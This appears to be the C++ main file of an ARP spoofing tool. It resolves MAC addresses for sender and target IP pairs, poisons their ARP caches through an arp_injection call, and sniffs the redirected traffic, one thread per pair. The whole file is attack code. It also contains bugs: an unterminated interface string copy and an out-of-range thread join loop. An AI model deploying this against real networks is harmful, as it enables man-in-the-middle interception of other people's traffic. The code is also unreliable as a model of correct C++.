#include <iostream>
#include <string.h>
#include <arpa/inet.h>
#include <thread>
#include "mypcap.h"
#include <vector>


//using std::thread;
using namespace std;

void onefunction(char* interface, char** argv,int is,struct packet_addr pd){

    getMacIPAddress(interface, pd.mymac, pd.myip);
    printf("================Start ARP===================\n");
    printf("[%d]interface is %s\n",is, interface);
    printf("[%d]myMAC[%02X:%02X:%02X:%02X:%02X:%02X]\n",is,pd.mymac[0],pd.mymac[1],pd.mymac[2],pd.mymac[3],pd.mymac[4],pd.mymac[5]);
    printf("[%d]myIP[%d.%d.%d.%d]\n",is,pd.myip[0],pd.myip[1],pd.myip[2],pd.myip[3]);

    //split argv
    uint32_t sip = inet_addr(argv[is*2]);
    uint32_t dip = inet_addr(argv[is*2+1]);

    memcpy(pd.sender_ip, &sip, sizeof(uint8_t)*4);
    memcpy(pd.target_ip, &dip, sizeof(uint8_t)*4);

    int len =0;
    myether myether = make_eth(pd.mymac,pd.broadcast);
    myarp myarp_t = make_arp(1,pd.mymac, pd.myip, pd.unknown, pd.target_ip);
    unsigned char * packet_t = make_packet(myether,myarp_t, len);
    get_arpmac(interface,packet_t,len,pd.target_mac,pd.target_ip);
    printf("[%d]Target ip[%d.%d.%d.%d]\n",is,pd.target_ip[0],pd.target_ip[1],pd.target_ip[2],pd.target_ip[3]);
    printf("[%d]Target mac[%x:%x:%x:%x:%x:%x]\n",is,pd.target_mac[0],pd.target_mac[1],pd.target_mac[2],pd.target_mac[3],pd.target_mac[4],pd.target_mac[5]);

    len=0;
    myarp myarp_s = make_arp(1,pd.mymac,pd.myip, pd.unknown, pd.sender_ip);
    unsigned char * packet_s = make_packet(myether, myarp_s, len);
    get_arpmac(interface,packet_s,len,pd.sender_mac,pd.sender_ip);
    printf("[%d]Sender ip[%d.%d.%d.%d]\n",is,pd.sender_ip[0],pd.sender_ip[1],pd.sender_ip[2],pd.sender_ip[3]);
    printf("[%d]Sender mac[%x:%x:%x:%x:%x:%x]\n",is,pd.sender_mac[0],pd.sender_mac[1],pd.sender_mac[2],pd.sender_mac[3],pd.sender_mac[4],pd.sender_mac[5]);


    arp_injection(10,interface, &pd);
    packet_sniffing(interface, &pd);
}

void usage(){
    cout<<"syntax: arp_spoofing <interface> <sender_ip> <target_ip>\n";
    cout<<"sample: arp_spoofing eth0 192.168.10.2 192.168.10.1\n";
}

int main(int argc, char* argv[])
{
    //usage check
    if(argc < 4){
        usage();
        return -1;
    }

    char *interface = (char*)malloc(strlen(argv[1]));
    memcpy(interface, argv[1], strlen(argv[1]));

    //receive argvs
    int argvcnt = (argc-2)/2;
    vector<thread> a;
    struct packet_addr* pd = new packet_addr[argvcnt];
    if(argvcnt == 1){
        printf("a\n");
        onefunction(interface,argv,1,pd[0]);
    }else{
        for(int i = 1; i<=argvcnt;i++){
            //create threads
            a.push_back(thread(onefunction, interface, argv,i,pd[i-1]));
        }
        for(int j = 1; j<=argvcnt;j++){
            a[j].join();
        }
    }
    return 0;
}
